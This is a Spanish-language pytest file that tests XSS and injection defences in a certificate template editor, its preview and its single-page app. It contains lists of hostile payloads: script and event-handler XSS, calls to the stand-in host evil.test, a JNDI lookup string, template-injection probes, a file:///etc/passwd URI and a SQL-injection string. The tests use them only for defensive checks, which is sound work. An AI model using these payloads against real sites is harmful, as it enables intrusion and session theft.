"""T-143 (CC-NFR-008, DS-22; design.md §5.4, §11.4): XSS en el editor y la vista previa.

Extiende ``services/constancias/tests/test_seguridad_render.py`` (T-210) sin repetir sus casos: aquí
se cruzan MÁS vectores con TODAS las variables de las plantillas de referencia y se revisa la
estructura del HTML resultante (etiquetas y atributos permitidos), no solo cadenas sueltas. También
se comprueba la otra mitad de la defensa: la CSP del documento y el ``iframe`` con ``sandbox`` sin
permisos de la SPA, y que la SPA no inserta HTML sin escapar.

El PDF real (WeasyPrint, SSRF y archivos locales) se prueba en contenedor con ``scripts/probar_pdf.ps1``
(``services/constancias/tests/test_pdf_rendimiento.py``); aquí el HTML es el mismo que consume ese PDF.
"""

import re
from html.parser import HTMLParser
from pathlib import Path

import pytest
from cc_common.errores import ErrorValidacion
from cc_constancias import contenido as c
from cc_constancias.render import html as r
from markupsafe import escape
from referencia import COLABORADOR, REFERENCIAS

RAIZ = Path(__file__).resolve().parents[2]

VECTORES = [
    "<script>alert(document.cookie)</script>",
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
    "' onmouseover='alert(1)",
    "javascript:alert(1)",
    '<a href="javascript:alert(1)">clic</a>',
    "<body onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<meta http-equiv='refresh' content='0;url=http://evil.test'>",
    "<base href='http://evil.test/'>",
    "<style>@import url(http://evil.test/x.css);</style>",
    "</style><script>alert(1)</script>",
    "<math><mtext></p><script>alert(1)</script>",
    "<!--<script>alert(1)</script>-->",
    "‮<script>alert(1)</script>",  # carácter de derecha a izquierda
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",  # ya escapado: no debe des-escaparse
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "{% for x in range(9**9) %}{% endfor %}",
    "${jndi:ldap://evil.test/a}",
    '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
]

ETIQUETAS = r.ETIQUETAS_PERMITIDAS | {"html", "head", "meta", "title", "style", "body"}


class Inspector(HTMLParser):
    """Registra etiquetas y atributos del HTML emitido para revisarlos sin expresiones regulares."""

    def __init__(self):
        super().__init__(convert_charrefs=False)
        self.etiquetas: list[str] = []
        self.atributos: list[tuple[str, str, str | None]] = []

    def handle_starttag(self, tag, attrs):
        self.etiquetas.append(tag)
        self.atributos += [(tag, k, v) for k, v in attrs]


def inspeccionar(html: str) -> Inspector:
    i = Inspector()
    i.feed(html)
    return i


def _renderizar(valores_hostiles: dict[str, str], contenido_ref="laboral", **extra) -> str:
    contenido = c.leer(REFERENCIAS[contenido_ref])
    valores = {v: COLABORADOR.get(v, "x") for v in c.variables_usadas(contenido)}
    valores.update(valores_hostiles)
    datos = r.DatosRender(valores, "CG-2026-0001", "A" * 22, "cc.test", **extra)
    return r.renderizar(contenido, datos)


def _revisar(html: str) -> None:
    i = inspeccionar(html)
    assert set(i.etiquetas) <= ETIQUETAS, set(i.etiquetas) - ETIQUETAS
    assert i.etiquetas.count("script") == 0 and "iframe" not in i.etiquetas
    for etiqueta, atributo, valor in i.atributos:
        assert not atributo.startswith("on"), (etiqueta, atributo)
        if atributo in ("src", "href", "action", "formaction", "srcset", "data"):
            # solo imágenes incrustadas (el QR y el logotipo); nunca una dirección a seguir
            assert etiqueta == "img" and (valor or "").startswith("data:image/"), (etiqueta, valor)
        assert atributo != "style" or "url(" not in (valor or "").lower()
    # la CSP del documento: nada externo ni scripts, ni siquiera dentro del iframe de la vista previa
    assert "default-src 'none'" in html and "script-src" not in html
    # el único <style> es el generado por el sistema
    assert i.etiquetas.count("style") == 1


@pytest.mark.parametrize("vector", VECTORES)
@pytest.mark.parametrize("plantilla", ["laboral", "guarderia", "consulado"])
def test_cada_variable_hostil_sale_escapada_en_todas_las_plantillas_de_referencia(
    vector, plantilla
):
    contenido = c.leer(REFERENCIAS[plantilla])
    variables = c.variables_usadas(contenido)
    assert variables, plantilla
    # todas las variables a la vez: el vector llega por cualquiera de las rutas de salida
    html = _renderizar({v: vector for v in variables}, plantilla)
    _revisar(html)
    # en ninguna parte queda una etiqueta viva con el contenido hostil
    for peligro in ("<script", "<svg", "<iframe", "<base", "<body onload", "<a href"):
        assert peligro not in html.lower().replace("<body>", ""), peligro
    assert str(escape(vector)) in html  # el texto sigue ahí, pero como texto


def test_el_texto_ya_escapado_no_se_des_escapa_y_las_plantillas_de_jinja_no_se_evaluan():
    html = _renderizar({"nombre_completo": "&lt;b&gt; {{ 7*7 }} {% if 1 %}x{% endif %}"})
    assert "&amp;lt;b&amp;gt;" in html  # una sola capa de escape, sin doble interpretación
    assert "{{ 7*7 }}" in html and "49" not in re.sub(r"<style>.*?</style>", "", html, flags=re.S)


def test_el_logotipo_y_el_folio_no_son_vectores():
    for malo in (
        "javascript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD4=",
        "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",  # SVG con script
        "https://evil.test/x.png",
        "file:///etc/passwd",
        'data:image/png;base64,AAAA" onerror="alert(1)',
    ):
        try:
            html = _renderizar({}, logotipo_data_uri=malo)
        except (ValueError, ErrorValidacion):
            continue  # rechazado: correcto
        _revisar(html)
        assert malo not in html
    for folio in ("CG-2026-0001<script>", 'CG-2026-0001"onload="x', "' OR 1=1 --", "../../etc"):
        with pytest.raises(ValueError):
            r.renderizar(
                c.leer(REFERENCIAS["laboral"]),
                r.DatosRender({v: "x" for v in c.variables_usadas(c.leer(REFERENCIAS["laboral"]))},
                              folio, "A" * 22, "cc.test"),
            )  # fmt: skip


@pytest.mark.parametrize(
    "texto",
    [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "< script>alert(1)</script>",
        "<!-- comentario -->",
        "<?xml version='1.0'?>",
        "hola </p><iframe src=x>",
        "<svg onload=alert(1)>",
    ],
)
def test_el_texto_fijo_de_la_plantilla_con_marcado_se_rechaza_al_guardar(texto):
    with pytest.raises(ErrorValidacion):
        c.leer({"esquema": 1, "bloques": [{"tipo": "parrafo", "contenido": [{"texto": texto}]}]})


@pytest.mark.parametrize(
    "esquema",
    [
        {"tipo": "script", "contenido": [{"texto": "x"}]},  # bloque que no existe
        {"tipo": "parrafo", "onclick": "alert(1)", "contenido": [{"texto": "x"}]},  # atributo extra
        {
            "tipo": "parrafo",
            "contenido": [{"texto": "x", "estilo": "x;background:url(http://e.test)"}],
        },
        {
            "tipo": "parrafo",
            "alineacion": "left;background:url(http://evil.test)",
            "contenido": [{"texto": "x"}],
        },  # fmt: skip
        {"tipo": "parrafo", "contenido": [{"var": "no_existe<script>"}]},
        {"tipo": "parrafo", "contenido": [{"html": "<script>alert(1)</script>"}]},
    ],
)
def test_el_editor_no_admite_bloques_atributos_ni_estilos_fuera_del_esquema(esquema):
    with pytest.raises(ErrorValidacion):
        c.leer({"esquema": 1, "bloques": [esquema]})


def test_colores_y_tamanos_de_pagina_con_css_inyectado_se_rechazan():
    base = {"tipo": "parrafo", "contenido": [{"texto": "x"}]}
    for pagina in (
        {"color": "red;} body{display:none"},
        {"color": "url(http://evil.test)"},
        {"tamano": "CARTA; @import url(x)"},
        {"fuente": "Arial;} *{background:url(http://evil.test)}"},
    ):
        try:
            contenido = c.leer({"esquema": 1, "pagina": pagina, "bloques": [base]})
        except ErrorValidacion:
            continue
        html = r.renderizar(contenido, r.DatosRender({}, "CG-2026-0001", "A" * 22, "cc.test"))
        assert "evil.test" not in html and "display:none" not in html.replace(" ", "")


# --------------------------------------------------------------------------- la otra mitad: la SPA


def test_la_vista_previa_de_la_spa_va_en_un_iframe_con_sandbox_sin_permisos():
    fuente = (RAIZ / "frontend/src/features/constancias/editor/VistaPrevia.tsx").read_text("utf-8")
    iframe = re.search(r"<iframe[^>]*>", fuente, re.S)
    assert iframe, "la vista previa debe mostrarse en un iframe"
    etiqueta = iframe.group(0)
    assert 'sandbox=""' in etiqueta  # sin allow-scripts, allow-same-origin ni allow-popups
    assert "allow-" not in etiqueta
    assert "srcDoc" in etiqueta and "referrerPolicy" in etiqueta


def test_la_spa_no_inserta_html_sin_escapar_en_ninguna_pantalla():
    peligros = (
        "dangerouslySetInnerHTML",
        ".innerHTML",
        "insertAdjacentHTML",
        "document.write(",
        "eval(",
    )
    encontrados = []
    for ruta in (RAIZ / "frontend" / "src").rglob("*.ts*"):
        if ".test." in ruta.name or ruta.name == "setup.ts" or "generado" in ruta.parts:
            continue
        texto = ruta.read_text("utf-8")
        encontrados += [f"{ruta.relative_to(RAIZ)}: {p}" for p in peligros if p in texto]
    assert not encontrados, encontrados


def test_la_spa_guarda_los_tokens_fuera_de_localstorage():
    """design.md §11.4: memoria y sessionStorage; localStorage reduciría el valor de la CSP (DS-22)."""
    usos = []
    for ruta in (RAIZ / "frontend" / "src").rglob("*.ts*"):
        if ".test." in ruta.name or ruta.name == "setup.ts":
            continue
        texto = ruta.read_text("utf-8")
        if "localStorage" in texto and re.search(
            r"localStorage\.\w+\([^)]*(token|jwt|access)", texto, re.I
        ):
            usos.append(str(ruta.relative_to(RAIZ)))
    assert not usos, usos


# --------------------------------------------------------------------------- por la API (con datos)


@pytest.mark.docker
async def test_nombres_y_puestos_hostiles_dados_de_alta_por_la_api_se_ven_como_texto(mundo_seg):
    """De punta a punta: el dato entra por la API de colaboradores y sale en la vista previa."""
    w = mundo_seg
    hostil = "<img src=x onerror=alert(1)>"
    r_alta = await w.http_col.post(
        "/api/v1/colaboradores",
        json={
            "numero_empleado": "XSS-1", "nombres": hostil, "apellido_paterno": "<script>x</script>",
            "apellido_materno": "Luna", "celular": "8100000001",
            "organizacion_id": w.a.organizacion_id, "planta_id": w.a.planta_id,
            "fecha_ingreso": "2020-03-15", "puesto": "<svg onload=alert(1)>",
            "tipo_empleado": "ADMINISTRATIVO", "campos": {}, "consentimiento": True,
        },
        headers=w.a.rh,
    )  # fmt: skip
    if r_alta.status_code == 422:
        return  # rechazado en la entrada: también es una defensa válida
    assert r_alta.status_code == 201, r_alta.text
    colaborador = r_alta.json()["id"]
    plantilla = next(iter(w.a.plantillas.values()))
    contenido = {"esquema": 1, "bloques": [{"tipo": "parrafo", "contenido": [
        {"var": "nombre_completo"}, {"texto": " / "}, {"var": "puesto"}]}]}  # fmt: skip
    r_ = await w.http_con.put(
        f"/api/v1/plantillas/{plantilla}/borrador", json=contenido, headers=w.a.rh
    )
    assert r_.status_code == 200, r_.text
    r_ = await w.http_con.post(
        f"/api/v1/plantillas/{plantilla}/vista-previa",
        json={"colaborador_id": colaborador, "usar_borrador": True}, headers=w.a.rh,
    )  # fmt: skip
    assert r_.status_code == 200, r_.text
    html = r_.json()["html"]
    _revisar(html)
    assert "&lt;img" in html and "&lt;script&gt;" in html and "&lt;svg" in html
